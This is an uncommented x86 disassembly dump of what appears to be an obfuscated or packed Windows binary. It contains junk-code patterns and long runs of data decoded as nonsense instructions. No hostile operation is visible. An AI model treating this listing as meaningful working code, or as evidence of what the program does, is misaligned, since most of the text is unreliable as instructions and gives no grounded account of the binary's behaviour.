  40e390:	cmp    DWORD PTR [ebp+0x8],0x52
  40e394:	mov    DWORD PTR ds:0x433603,0x3dd6
  40e39e:	jb     0x40e348
  40e3a4:	mov    DWORD PTR ds:0x433697,0x7cb6
  40e3ae:	jmp    0x40e830
  40e3b3:	mov    DWORD PTR ds:0x433603,0x6b28
  40e3bd:	cmp    edi,0x1a3
  40e3c3:	mov    DWORD PTR ds:0x4336af,0x27e
  40e3cd:	jne    0x40e58c
  40e3d3:	movzx  eax,BYTE PTR ds:0x43372b
  40e3da:	and    DWORD PTR ds:0x43360b,eax
  40e3e0:	mov    DWORD PTR [ebp-0x60],0xf89c853d
  40e3e7:	add    DWORD PTR ds:0x433663,0x2f92
  40e3f1:	mov    eax,DWORD PTR [ebp-0x4]
  40e3f4:	mov    DWORD PTR [ebp-0x5c],eax
  40e3f7:	mov    eax,DWORD PTR [ebp-0x8]
  40e3fa:	mov    DWORD PTR [ebp-0x58],eax
  40e3fd:	and    eax,DWORD PTR ds:0x433713
  40e403:	jmp    0x40e53c
  40e408:	test   al,0xb5
  40e40a:	test   al,0xe6
  40e40c:	mov    cl,0xe3
  40e40e:	jo     0x40e481
  40e410:	stc    
  40e411:	ret    0x425b
  40e414:	sub    al,0xd3
  40e416:	ret    
  40e417:	test   BYTE PTR [esi],dl
  40e419:	cwde   
  40e41a:	jle    0x40e49a
  40e41c:	adc    bh,BYTE PTR [edi+0x7e]
  40e41f:	jle    0x40e409
  40e421:	jle    0x40e3f9
  40e423:	hlt    
  40e424:	cmc    
  40e425:	aas    
  40e426:	and    ecx,DWORD PTR [esi-0x76b2b66f]
  40e42c:	mov    dl,ch
  40e42e:	leave  
  40e42f:	mov    ds:0x7093ba84,al
  40e434:	lock int 0xb5
  40e437:	outs   dx,DWORD PTR ds:[esi]
  40e438:	push   es
  40e439:	int    0xdd
  40e43b:	inc    ebx
  40e43c:	xor    bl,BYTE PTR [eax+0x3bd173ca]
  40e442:	and    ch,dl
  40e444:	jbe    0x40e47e
  40e446:	jge    0x40e3db
  40e448:	mov    al,0x38
  40e44a:	in     eax,dx
  40e44b:	fild   WORD PTR [esi+0x7dcd8b41]
  40e451:	mov    ecx,esp
  40e453:	sub    al,0xed
  40e455:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e456:	and    al,0x85
  40e458:	lahf   
  40e459:	pusha  
  40e45a:	jnp    0x40e483
  40e45c:	jecxz  0x40e406
  40e45e:	mov    BYTE PTR [eax-0x7c63d5c4],al
  40e464:	out    dx,eax
  40e465:	or     DWORD PTR fs:[ecx-0x76],0xffffffd6
  40e46a:	inc    edi
  40e46b:	jp     0x40e42a
  40e46d:	outs   dx,BYTE PTR ds:[esi]
  40e46e:	add    DWORD PTR [esi+0x76961a6d],eax
  40e474:	dec    esp
  40e475:	jp     0x40e4e4
  40e477:	fnstcw WORD PTR [edx+0x1198dc9a]
  40e47d:	jmp    0xbaaa:0xabd0a55f
  40e484:	push   ebp
  40e485:	add    eax,ecx
  40e487:	outs   dx,BYTE PTR ds:[esi]
  40e488:	sub    BYTE PTR [ebx],ah
  40e48a:	cmp    DWORD PTR [eax+0x61],ebp
  40e48d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e48e:	fisubr DWORD PTR [ebx]
  40e490:	outs   dx,BYTE PTR ds:[esi]
  40e491:	enter  0xb528,0xa2
  40e495:	mov    eax,ds:0x3ac6414d
  40e49a:	or     edx,edi
  40e49c:	daa    
  40e49d:	push   esp
  40e49e:	fild   DWORD PTR [ebx-0x70a04260]
  40e4a4:	adc    bh,BYTE PTR [ecx-0x236dee4e]
  40e4aa:	call   0xc1962c71
  40e4af:	dec    esi
  40e4b0:	cmp    al,0x69
  40e4b2:	aaa    
  40e4b3:	sub    ebx,DWORD PTR [edx+0x3a046d1]
  40e4b9:	jno    0x40e4e8
  40e4bb:	(bad)  
  40e4bc:	daa    
  40e4bd:	mov    eax,0x58fe5f0d
  40e4c2:	addr16 stc 
  40e4c4:	and    eax,0x445722cb
  40e4c9:	mov    ?,WORD PTR [edi-0x2550885c]
  40e4cf:	lods   al,BYTE PTR ds:[esi]
  40e4d0:	sbb    al,0x63
  40e4d2:	xchg   BYTE PTR [esi+0x47d5011d],dl
  40e4d8:	bnd jp 0x40e547
  40e4db:	ficom  DWORD PTR [esi+0x248a3766]
  40e4e1:	mov    ah,0x80
  40e4e3:	cmp    dl,0x7a
  40e4e6:	dec    ebx
  40e4e7:	xor    cl,al
  40e4e9:	sbb    al,0x5d
  40e4eb:	dec    eax
  40e4ec:	pop    ebp
  40e4ed:	xor    bl,BYTE PTR [esi]
  40e4ef:	dec    edx
  40e4f0:	inc    ecx
  40e4f1:	cmp    eax,0xab21d06b
  40e4f6:	sbb    DWORD PTR [eax-0x74],edx
  40e4f9:	(bad)  
  40e4fa:	retf   
  40e4fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e4fc:	ss jnp 0x40e496
  40e4ff:	mov    ebx,0xc02e1da8
  40e504:	loopne 0x40e496
  40e506:	mov    bh,0xed
  40e508:	push   edi
  40e509:	jns    0x40e50f
  40e50b:	mov    cs,WORD PTR [eax+0x62f63d3d]
  40e511:	lods   al,BYTE PTR ds:[esi]
  40e512:	adc    al,0xd7
  40e514:	xor    ebx,DWORD PTR [edi-0x79]
  40e517:	adc    al,0x49
  40e519:	jmp    0xced2:0xd88bd98
  40e520:	cmp    al,0x23
  40e522:	sbb    al,0xb
  40e524:	idiv   ecx
  40e526:	jl     0x40e523
  40e528:	xchg   edi,eax
  40e529:	in     eax,dx
  40e52a:	outs   dx,DWORD PTR ds:[esi]
  40e52b:	cmp    al,BYTE PTR [ebx]
  40e52d:	out    0x93,eax
  40e52f:	mov    ecx,0xcd27c7fe
  40e534:	or     BYTE PTR [eax-0x6d72ad4d],0xe1
  40e53b:	test   DWORD PTR [ebx+0xd81f445],0x4336a3
  40e545:	jmp    0x40e57d
  40e547:	inc    ebx
  40e548:	add    BYTE PTR [ebx],dh
  40e54a:	mov    BYTE PTR [ebx],0xc3
  40e54d:	sbb    DWORD PTR ds:0x4336db,0x4336af
  40e557:	mov    DWORD PTR [ebp-0x54],eax
  40e55a:	lea    eax,[ebp-0x1c]
  40e55d:	mov    DWORD PTR [ebp-0x50],eax
  40e560:	mov    eax,DWORD PTR [ebp-0x60]
  40e563:	xor    eax,esi
  40e565:	add    eax,ebx
  40e567:	mov    DWORD PTR [ebp-0x60],eax
  40e56a:	lea    eax,[ebp-0x60]
  40e56d:	push   eax
  40e56e:	mov    eax,DWORD PTR [ebp+0xc]
  40e571:	xor    eax,esi
  40e573:	add    eax,ebx
  40e575:	push   eax
  40e576:	mov    eax,ds:0x413b54
  40e57b:	push   0x413aaa
  40e580:	push   DWORD PTR [eax]
  40e582:	call   0x40984d
  40e587:	jmp    0x40e830
  40e58c:	cmp    edi,0x13d
  40e592:	jne    0x40e830
  40e598:	mov    eax,DWORD PTR [ebp-0x10]
  40e59b:	xor    eax,esi
  40e59d:	add    eax,ebx
  40e59f:	mov    DWORD PTR [ebp+0x8],eax
  40e5a2:	jmp    0x40e6db
  40e5a7:	shl    BYTE PTR [eax+eax*8-0xf8f9fd0],0x74
  40e5af:	sub    eax,0x6ef261b8
  40e5b4:	rol    DWORD PTR [esi+0x7e992a7d],0x7e
  40e5bb:	adc    bh,BYTE PTR [edi+0x7e]
  40e5be:	jle    0x40e57d
  40e5c0:	mov    ebp,0x85ad8947
  40e5c5:	or     al,BYTE PTR [eax-0x4f]
  40e5c8:	add    BYTE PTR [esp+eax*8],0x7e
  40e5cc:	mov    ch,BYTE PTR [ebp-0x64]
  40e5cf:	sub    al,0x72
  40e5d1:	imul   esi,DWORD PTR [esi-0x6c35c8c7],0xffffffc6
  40e5d8:	in     eax,dx
  40e5d9:	sbb    cl,BYTE PTR [esi-0x19]
  40e5dc:	xchg   esp,eax
  40e5dd:	ins    BYTE PTR es:[edi],dx
  40e5de:	icebp  
  40e5df:	push   ss
  40e5e0:	inc    ebx
  40e5e1:	fs (bad) 
  40e5e3:	in     eax,dx
  40e5e4:	inc    eax
  40e5e5:	sar    DWORD PTR [ebx-0x76],0x1f
  40e5e9:	popa   
  40e5ea:	call   0x9f77889d
  40e5ef:	adc    BYTE PTR [edx+eax*2+0x3de26864],cl
  40e5f6:	sub    DWORD PTR [esi+0x15190eea],esi
  40e5fc:	mov    eax,edi
  40e5fe:	push   es
  40e5ff:	or     DWORD PTR [esp+ebx*1],0xffffffdb
  40e603:	les    ebx,FWORD PTR [ebp+0x3b]
  40e606:	stos   DWORD PTR es:[edi],eax
  40e607:	push   0x3d322bf7
  40e60c:	sti    
  40e60d:	or     al,0xcc
  40e60f:	mov    ah,0x5d
  40e611:	popa   
  40e612:	(bad)  
  40e613:	pop    ds
  40e614:	in     eax,0x2a
  40e616:	dec    eax
  40e617:	mov    al,BYTE PTR [edi+ebp*4-0x4f858dc8]
  40e61e:	aas    
  40e61f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e620:	popf   
  40e621:	cdq    
  40e622:	and    dh,BYTE PTR [ecx-0x98fd9bc]
  40e628:	rcl    esp,1
  40e62a:	sub    edi,DWORD PTR [edi+0x64748f3]
  40e630:	cld    
  40e631:	pop    ss
  40e632:	xchg   ecx,eax
  40e633:	aad    0x25
  40e635:	cli    
  40e636:	gs dec ecx
  40e638:	ret    0x274c
  40e63b:	aam    0xed
  40e63d:	call   DWORD PTR [esi+0x234561a4]
  40e643:	jne    0x40e665
  40e645:	ret    
  40e646:	aad    0x63
  40e648:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e649:	fs push ss
  40e64b:	(bad)  
  40e64c:	hlt    
  40e64d:	test   BYTE PTR [esi],bl
  40e64f:	mov    ecx,0x90f1971c
  40e654:	xchg   ebx,eax
  40e655:	fdiv   QWORD PTR [eax-0x4d669613]
  40e65b:	add    al,BYTE PTR [esi-0x77]
  40e65e:	es add ebx,edx
  40e661:	ja     0x40e677
  40e663:	inc    edx
  40e664:	outs   dx,BYTE PTR ds:[esi]
  40e665:	outs   dx,DWORD PTR ds:[esi]
  40e666:	jno    0x40e6c6
  40e668:	mov    al,ds:0x68e26f95
  40e66d:	cmp    eax,0x196965f4
  40e672:	data16 sbb dl,bh
  40e675:	push   ds
  40e676:	out    0x9b,al
  40e678:	sahf   
  40e679:	out    dx,eax
  40e67a:	jne    0x40e608
  40e67c:	ffree  st(6)
  40e67e:	shl    BYTE PTR [esi],0x9b
  40e681:	jmp    0x40e6bf
  40e683:	xchg   BYTE PTR [edi-0x56],dh
  40e686:	jbe    0x40e687
  40e688:	lds    esp,FWORD PTR [eax+0x25]
  40e68b:	or     esi,DWORD PTR [ecx]
  40e68d:	xlat   BYTE PTR ds:[ebx]
  40e68e:	retf   0x2c8b
  40e691:	mov    edi,0x9b1b4402
  40e696:	stos   BYTE PTR es:[edi],al
  40e697:	idiv   DWORD PTR [ebp+0x9]
  40e69a:	es pushf 
  40e69c:	jmp    0xf61f887a
  40e6a1:	outs   dx,BYTE PTR ds:[esi]
  40e6a2:	lods   eax,DWORD PTR ds:[esi]
  40e6a3:	pop    ss
  40e6a4:	icebp  
  40e6a5:	dec    edx
  40e6a6:	xchg   DWORD PTR [eax+0x2f],ebp
  40e6a9:	jg     0x40e647
  40e6ab:	ror    ebx,0x41
  40e6ae:	and    eax,0x3e1abc57
  40e6b3:	mov    cl,0x69
  40e6b5:	dec    ecx
  40e6b6:	in     eax,dx
  40e6b7:	pop    ebp
  40e6b8:	or     eax,0x44
  40e6bb:	mov    al,0xba
  40e6bd:	xor    BYTE PTR gs:[esi],al
  40e6c0:	icebp  
  40e6c1:	add    BYTE PTR [edi],0x74
  40e6c4:	das    
  40e6c5:	fstp   DWORD PTR [esi+eiz*8]
  40e6c8:	and    BYTE PTR [eax],bh
  40e6ca:	neg    BYTE PTR [edi-0x80]
  40e6cd:	and    dh,al
  40e6cf:	lahf   
  40e6d0:	rcl    DWORD PTR [eax],cl
  40e6d2:	cmp    DWORD PTR [edi+0x2],edi
  40e6d5:	sbb    eax,0xdb3d2a0a
  40e6da:	enter  0x34a1,0x3b
  40e6de:	inc    ecx
  40e6df:	add    BYTE PTR [ecx+0x458b0845],cl
  40e6e5:	in     al,dx
  40e6e6:	jmp    0x40e81f
  40e6eb:	jb     0x40e70f
  40e6ed:	lods   al,BYTE PTR ds:[esi]
  40e6ee:	jmp    0x9bdf:0xa270706c
  40e6f5:	mov    al,BYTE PTR [ecx+0x62681852]
  40e6fb:	into   
  40e6fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e6fd:	jle    0x40e77d
  40e6ff:	adc    bh,BYTE PTR [edi+0x7e]
  40e702:	jle    0x40e6dc
  40e704:	fisttp DWORD PTR [ebp+0x4c]
  40e707:	sub    al,0x10
  40e709:	cld    
  40e70a:	fild   DWORD PTR [edx+esi*8]
  40e70d:	xor    eax,0x1f852b1f
  40e712:	pop    esi
  40e713:	fsubr  DWORD PTR [edx-0x4afabfdd]
  40e719:	dec    ebx
  40e71a:	imul   ecx,DWORD PTR [esi+0x299d3124],0xb284f4f5
  40e724:	cli    
  40e725:	lock rol DWORD PTR [ecx],1
  40e728:	add    DWORD PTR [esi],0x11
  40e72b:	popa   
  40e72c:	test   DWORD PTR [ebx-0x2f],ecx
  40e72f:	push   eax
  40e730:	pop    ebp
  40e731:	mov    ds:0x616af368,eax
  40e736:	mov    dh,0x10
  40e738:	cmc    
  40e739:	mov    cl,BYTE PTR [edi-0x511120e8]
  40e73f:	aad    0x79
  40e741:	(bad)  
  40e742:	jmp    0x40e70f
  40e744:	test   al,0xbd
  40e746:	adc    al,0x7e
  40e748:	mov    ch,0xa6
  40e74a:	test   eax,0x5bd22594
  40e74f:	jns    0x40e795
  40e751:	jmp    0x83ad3390
  40e756:	sbb    BYTE PTR [ebx-0x5edd69cd],ah
  40e75c:	xchg   BYTE PTR [ecx+0x2],bh
  40e75f:	scas   eax,DWORD PTR es:[edi]
  40e760:	cmp    al,ah
  40e762:	mov    edi,0x116feb0f
  40e767:	add    BYTE PTR [edx],dl
  40e769:	jl     0x40e7de
  40e76b:	xchg   ebp,eax
  40e76c:	lods   eax,DWORD PTR ds:[esi]
  40e76d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e76e:	popa   
  40e76f:	call   0x20160b5a
  40e774:	inc    eax
  40e775:	mov    ah,0xa0
  40e777:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e778:	test   eax,0x3be26ff3
  40e77d:	sub    edx,DWORD PTR [esi+eiz*1+0x48a53c5d]
  40e784:	cmc    
  40e785:	fs push 0x51
  40e788:	sbb    dl,BYTE PTR [esi+edi*4]
  40e78b:	xor    al,ah
  40e78d:	dec    ebx
  40e78e:	mov    es,WORD PTR [ecx-0x1b]
  40e791:	cs push edi
  40e793:	ss mov edx,0xcb958252
  40e799:	(bad)  
  40e79a:	outs   dx,BYTE PTR ds:[esi]
  40e79b:	add    cl,bl
  40e79d:	das    
  40e79e:	popa   
  40e79f:	popf   
  40e7a0:	sub    al,0x7e
  40e7a2:	(bad)  
  40e7a3:	jmp    0xc82a7247
  40e7a8:	jno    0x40e7b5
  40e7aa:	or     BYTE PTR [eax+0x20],bh
  40e7ad:	push   esp
  40e7ae:	inc    esp
  40e7af:	lds    edx,FWORD PTR [esi+0x2b3ad7e2]
  40e7b5:	or     BYTE PTR [edx-0x273a530d],dh
  40e7bb:	xchg   edi,eax
  40e7bc:	push   cs
  40e7bd:	stc    
  40e7be:	xchg   edx,eax
  40e7bf:	add    esp,edx
  40e7c1:	pop    ebp
  40e7c2:	sti    
  40e7c3:	jecxz  0x40e7e7
  40e7c5:	aas    
  40e7c6:	fimul  DWORD PTR [ecx+0x353c23bb]
  40e7cc:	mov    eax,0x8e5d9bd4
  40e7d1:	mov    DWORD PTR [esi],eax
  40e7d3:	leave  
  40e7d4:	nop
  40e7d5:	push   edx
  40e7d6:	ret    0xa71b
  40e7d9:	aad    0xfc
  40e7db:	enter  0xa99,0x8b
  40e7df:	mov    ebp,0xdcbfa8eb
  40e7e4:	out    dx,al
  40e7e5:	(bad)
  40e7ea:	xchg   BYTE PTR [edi+0x24],dh
  40e7ed:	push   eax
  40e7ee:	xchg   edx,eax
  40e7ef:	pop    ecx
  40e7f0:	popf   
  40e7f1:	es hlt 
  40e7f3:	cmp    dh,al
  40e7f5:	les    edi,FWORD PTR [ebx+0x66]
  40e7f8:	xlat   BYTE PTR ds:[ebx]
  40e7f9:	xor    esp,ebx
  40e7fb:	jmp    0xa22b7263
  40e800:	dec    edi
  40e801:	add    al,0x71
  40e803:	fwait
  40e804:	mov    bh,dl
  40e806:	loope  0x40e7b7
  40e808:	test   bh,dh
  40e80a:	jns    0x40e7ea
  40e80c:	or     bl,BYTE PTR [esp+eax*2-0x36]
  40e810:	test   al,0x5d
  40e812:	in     al,dx
  40e813:	or     ebp,DWORD PTR [ebx-0x3c]
  40e816:	fxch   st(0)
  40e818:	jp     0x40e7c7
  40e81a:	fdivr  DWORD PTR [ecx-0x21]
  40e81d:	or     BYTE PTR [esi-0x77],ch
  40e820:	inc    ebp
  40e821:	cld    
  40e822:	mov    eax,DWORD PTR [ebp-0x4]
  40e825:	push   0x4
  40e827:	pop    ecx
  40e828:	sub    ecx,eax
  40e82a:	add    ecx,DWORD PTR [ebp-0x18]
  40e82d:	mov    DWORD PTR [ebp-0x8],ecx
  40e830:	mov    eax,DWORD PTR [ebp+0xc]
  40e833:	xor    eax,esi
  40e835:	lea    edi,[edi+eax*1+0x32729b]
  40e83c:	cmp    edi,0x50b
  40e842:	jmp    0x40e97b
  40e847:	xor    al,0xd8
  40e849:	xchg   ebx,eax
  40e84a:	das    
  40e84b:	push   ebx
  40e84c:	jne    0x40e7fe
  40e84e:	loope  0x40e887
  40e850:	jecxz  0x40e800
  40e852:	loope  0x40e80e
  40e854:	jp     0x40e81c
  40e856:	mov    bl,0xe2
  40e858:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e859:	jle    0x40e8d9
  40e85b:	adc    bh,BYTE PTR [edi+0x7e]
  40e85e:	jle    0x40e8b4
  40e860:	push   es
  40e861:	dec    edi
  40e862:	rcr    DWORD PTR [edi],1
  40e864:	in     al,0x41
  40e866:	xor    ch,BYTE PTR [eax+ecx*2]
  40e869:	sub    DWORD PTR [ecx],eax
  40e86b:	(bad)  
  40e86c:	js     0x40e839
  40e86e:	aad    0x6
  40e870:	(bad)  
  40e871:	call   0xbedccb98
  40e876:	popf   
  40e877:	retf   
  40e878:	jle    0x40e89e
  40e87a:	in     al,0x81
  40e87c:	xrelease mov BYTE PTR [edi+esi*4+0x355a681a],dl
  40e884:	mov    al,0x8f
  40e886:	scas   al,BYTE PTR es:[edi]
  40e887:	xchg   edi,eax
  40e888:	aas    
  40e889:	repnz cmp BYTE PTR [ebx],0xa4
  40e88d:	or     BYTE PTR [ebp+0x6ffec61e],dh
  40e893:	mov    dl,0x43
  40e895:	lahf   
  40e896:	daa    
  40e897:	cmp    eax,0x32b3588d
  40e89c:	leave  
  40e89d:	xchg   BYTE PTR [edi+0x226b9335],ah
  40e8a3:	xchg   eax,eax
  40e8a5:	xchg   ebx,eax
  40e8a6:	pushf  
  40e8a7:	pop    esp
  40e8a8:	ins    DWORD PTR es:[edi],dx
  40e8a9:	pop    eax
  40e8aa:	popf   
  40e8ab:	stc    
  40e8ac:	cld    
  40e8ad:	scas   ax,WORD PTR es:[edi]
  40e8af:	(bad)  
  40e8b0:	xor    BYTE PTR [eax-0x29],dh
  40e8b3:	(bad)  
  40e8b4:	jmp    0x17fa:0x406cecde
  40e8bb:	aas    
  40e8bc:	pinsrw mm4,WORD PTR [eax],0x79
  40e8c0:	mov    ds:0x145c6acc,eax
  40e8c5:	mov    ebx,0xb0c2f84f
  40e8ca:	mov    bh,0x5a
  40e8cc:	push   esp
  40e8cd:	xchg   BYTE PTR es:[ebp+0x3545faac],dl
  40e8d4:	sub    DWORD PTR [ecx+0xf960992],ebp
  40e8da:	or     edx,DWORD PTR [ebx]
  40e8dc:	add    al,0xcc
  40e8de:	mov    ds:0x2bcb4499,eax
  40e8e3:	cmp    al,0xa9
  40e8e5:	js     0x40e910
  40e8e7:	icebp  
  40e8e8:	mov    ds:0xcf2ef447,eax
  40e8ed:	xor    eax,0xe575230b
  40e8f2:	retf   0x2273
  40e8f5:	jp     0x40e8ce
  40e8f7:	dec    ebx
  40e8f8:	daa    
  40e8f9:	cli    
  40e8fa:	fs test al,0xea
  40e8fd:	xchg   ecx,eax
  40e8fe:	out    dx,al
  40e8ff:	xchg   edx,eax
  40e900:	jmp    0xb332e72a
  40e905:	(bad)  [esp+ebp*1-0x7ed30962]
  40e90c:	lods   al,BYTE PTR ds:[si]
  40e90e:	xchg   DWORD PTR [esi-0x2deca0b2],esi
  40e914:	sbb    al,0xd6
  40e916:	jno    0x40e984
  40e918:	in     eax,0x3
  40e91a:	sub    DWORD PTR [esp+ebx*4],edx
  40e91d:	aas    
  40e91e:	icebp  
  40e91f:	cld    
  40e920:	push   eax
  40e921:	push   edi
  40e922:	inc    esi
  40e923:	xchg   BYTE PTR [ebx],dh
  40e925:	sbb    DWORD PTR [esi+ecx*1-0x3c8769a0],ecx
  40e92c:	push   edx
  40e92d:	push   ebx
  40e92e:	xor    eax,ebp
  40e930:	cwde   
  40e931:	scas   eax,DWORD PTR es:[edi]
  40e932:	sub    DWORD PTR [ebp+0x61ca6e9e],ecx
  40e938:	rol    BYTE PTR [edi+0x15],cl
  40e93b:	jecxz  0x40e8ec
  40e93d:	adc    al,0x53
  40e93f:	fcmovbe st,st(0)
  40e941:	mov    edi,0xd9652787
  40e946:	cmp    eax,0x1f6d3249
  40e94b:	jp     0x40e9a5
  40e94d:	jns    0x40e979
  40e94f:	add    eax,0xfe72f770
  40e954:	into   
  40e955:	test   al,0xae
  40e957:	pop    ss
  40e958:	outs   dx,BYTE PTR ds:[esi]
  40e959:	out    dx,al
  40e95a:	ins    BYTE PTR es:[edi],dx
  40e95b:	cwde   
  40e95c:	sbb    al,0x6f
  40e95e:	and    DWORD PTR [edx+0x3570d2aa],ebp
  40e964:	jmp    0x80a2d97
  40e969:	(bad)  
  40e96a:	mov    dh,0x2
  40e96c:	in     al,dx
  40e96d:	dec    esp
  40e96e:	jne    0x40e976
  40e970:	es xchg edi,eax
  40e972:	and    eax,0xf6b01298
  40e977:	mov    esp,0xf1dfb71
  40e97c:	test   DWORD PTR [esi],edi
  40e97e:	stc    
  40e97f:	(bad)  
  40e980:	dec    DWORD PTR [ebx+0x335f0c45]
  40e986:	(bad)  
  40e987:	pop    esi
  40e988:	jmp    0x40eac1
  40e98d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e98e:	sbb    bl,dh
  40e990:	loope  0x40ea05
  40e992:	icebp  
  40e993:	mov    ch,0x58
  40e995:	jns    0x40e920
  40e997:	add    eax,0x998bf01d
  40e99c:	xchg   BYTE PTR [si+0x7e7e],ah
  40e9a1:	adc    bh,BYTE PTR [edi+0x7e]
  40e9a4:	jle    0x40e9bf
  40e9a6:	pop    esi
  40e9a7:	jae    0x40e9f9
  40e9a9:	mov    al,0xf0
  40e9ab:	jae    0x40ea25
  40e9ad:	out    dx,al
  40e9ae:	ja     0x40e9fc
  40e9b0:	(bad)  
  40e9b1:	pushf  
  40e9b2:	stos   BYTE PTR es:[edi],al
  40e9b3:	mov    ecx,0xbb94e44f
  40e9b8:	add    eax,0x4e993407
  40e9bd:	fwait
  40e9be:	pop    ecx
  40e9bf:	(bad)  [eax+0x4c488d8a]
  40e9c5:	jo     0x40ea2e
  40e9c7:	sub    BYTE PTR [ebx],cl
  40e9c9:	fnstcw WORD PTR [ecx]
  40e9cb:	es inc edx
  40e9cd:	mov    ah,0xe8
  40e9cf:	stos   BYTE PTR es:[edi],al
  40e9d0:	into   
  40e9d1:	mov    al,ds:0x65a80c58
  40e9d6:	cmp    DWORD PTR [edx],eax
  40e9d8:	aas    
  40e9d9:	pop    eax
  40e9da:	pop    esp
  40e9db:	sub    BYTE PTR ds:0xdfd3715a,dl
  40e9e1:	mov    ebp,DWORD PTR ds:0xae482dd3
  40e9e7:	and    cl,dl
  40e9e9:	loope  0x40e9a8
  40e9eb:	(bad)  
  40e9ec:	loopne 0x40e981
  40e9ee:	pop    eax
  40e9ef:	fcomp  DWORD PTR [ebx+esi*2-0x46]
  40e9f3:	ret    
  40e9f4:	jbe    0x40ea56
  40e9f6:	fdivr  DWORD PTR [eax]
  40e9f8:	imul   esi,ebx,0x2c85a876
  40e9fe:	(bad)
  40ea02:	pop    ecx
  40ea03:	dec    edi
  40ea04:	cmc    
  40ea05:	ins    BYTE PTR es:[edi],dx
  40ea06:	out    0xb1,eax
  40ea08:	rol    BYTE PTR [ebx-0x1],0x75
  40ea0c:	mov    ds:0x681131f0,al
  40ea11:	mov    ecx,edi
  40ea13:	imul   ebx,DWORD PTR [esi+0x4b],0x74
  40ea17:	fcmovbe st,st(3)
  40ea19:	xor    BYTE PTR [ecx+0x70],0xc7
  40ea1d:	xor    al,0x64
  40ea1f:	fiadd  WORD PTR [eax-0x12]
  40ea22:	mov    DWORD PTR [ebx],ecx
  40ea24:	inc    ebx
  40ea25:	xchg   edx,eax
  40ea26:	inc    edx
  40ea27:	repz push ecx
  40ea29:	jno    0x40e9c7
  40ea2b:	loopne 0x40ea98
  40ea2d:	cwde   
  40ea2e:	mov    bh,0xb2
  40ea30:	push   esi
  40ea31:	test   DWORD PTR [edi-0x1314037a],esp
  40ea37:	sub    esi,DWORD PTR [edx-0x2b]
  40ea3a:	cmp    cl,ch
  40ea3c:	mov    DWORD PTR [edi],ebx
  40ea3e:	loopne 0x40eab3
  40ea40:	lea    esp,[edi+ebp*2]
  40ea43:	push   ss
  40ea44:	sub    BYTE PTR [ebx-0x7dbbc223],cl
  40ea4a:	lea    edx,[ebp+0x3f]
  40ea4d:	mov    bh,0x8d
  40ea4f:	(bad)  
  40ea50:	div    DWORD PTR [edi+0x55]
  40ea53:	pop    esi
  40ea54:	sub    ebx,DWORD PTR [ebp+0xadb34cd]
  40ea5a:	add    DWORD PTR [ecx+0x10535a8f],ecx
  40ea60:	pop    ecx
  40ea61:	pop    esi
  40ea62:	ds adc esi,ebx
  40ea65:	and    BYTE PTR [esi-0x5526d0f3],dh
  40ea6b:	inc    ebx
  40ea6c:	sbb    al,0xd8
  40ea6e:	cmp    bl,BYTE PTR [ecx]
  40ea70:	fisttp WORD PTR [eax]
  40ea72:	cdq    
  40ea73:	pop    ss
  40ea74:	(bad)  
  40ea75:	jl     0x40ea65
  40ea77:	push   0xc71c8fd4
  40ea7c:	push   edx
  40ea7d:	pop    ebp
  40ea7e:	mov    al,ds:0xb6d00153
  40ea83:	comiss xmm0,xmm3
  40ea86:	ss pop edi
  40ea88:	in     al,0x45
  40ea8a:	sbb    cl,BYTE PTR [esi]
  40ea8c:	call   0x606e:0x11a4bb1d
  40ea93:	push   edi
  40ea94:	add    eax,0xc2242bcf
  40ea99:	fimul  WORD PTR [edx+0x5]
  40ea9c:	jnp    0xc1cd5ca5
  40eaa2:	lods   eax,DWORD PTR ds:[esi]
  40eaa3:	lds    eax,FWORD PTR [ebp-0x66f77c1c]
  40eaa9:	arpl   WORD PTR [ecx+0x449601e7],sp
  40eaaf:	xchg   ecx,eax
  40eab0:	mov    bh,0x2d
  40eab2:	loopne 0x40eaeb
  40eab4:	xor    eax,0x2f762915
  40eab9:	imul   ecx,ebp,0x92c08ffc
  40eabf:	mov    ebx,DWORD PTR [edi+0x3]
  40eac2:	ret    
  40eac3:	pop    ebx
  40eac4:	leave  
  40eac5:	ret    0x8
  40eac8:	push   ebp
  40eac9:	mov    ebp,esp
  40eacb:	push   ecx
  40eacc:	mov    DWORD PTR ds:0x433693,0x1f
  40ead6:	cmp    DWORD PTR ds:0x433693,0x0
  40eadd:	je     0x40eb79
  40eae3:	cmp    DWORD PTR ds:0x433693,0xc
  40eaea:	jne    0x40eafe
  40eaf0:	push   0x1b35
  40eaf5:	push   DWORD PTR [ebp-0x14]
  40eaf8:	call   DWORD PTR ds:0x412368
  40eafe:	cmp    DWORD PTR ds:0x433693,0xd
  40eb05:	jne    0x40eb18
  40eb0b:	mov    edx,DWORD PTR ds:0x433693
  40eb11:	dec    edx
  40eb12:	mov    DWORD PTR ds:0x433693,edx
  40eb18:	mov    edx,DWORD PTR ds:0x433693
  40eb1e:	dec    edx
  40eb1f:	mov    DWORD PTR ds:0x433693,edx
  40eb25:	jmp    0x40ead6
  40eb2a:	mov    DWORD PTR ds:0x4336d3,0x16
  40eb34:	cmp    DWORD PTR ds:0x4336d3,0x0
  40eb3b:	je     0x40eb79
  40eb41:	cmp    DWORD PTR ds:0x4336d3,0x17
  40eb48:	jne    0x40eb5f
  40eb4e:	push   DWORD PTR [ebp-0x14]
  40eb51:	push   DWORD PTR [ebp-0xc]
  40eb54:	push   0x495a
  40eb59:	call   DWORD PTR ds:0x4120ec
  40eb5f:	mov    eax,ds:0x4336d3
  40eb64:	dec    eax
  40eb65:	mov    ds:0x4336d3,eax
  40eb6a:	jmp    0x40eb34
  40eb6f:	mov    DWORD PTR ds:0x4336e3,0x352
  40eb79:	push   ecx
  40eb7a:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  40eb81:	sbb    DWORD PTR ds:0x43369b,edx
  40eb87:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  40eb8e:	mov    eax,DWORD PTR [ebp-0x4]
  40eb91:	push   esi
  40eb92:	add    DWORD PTR ds:0x43372b,ebx
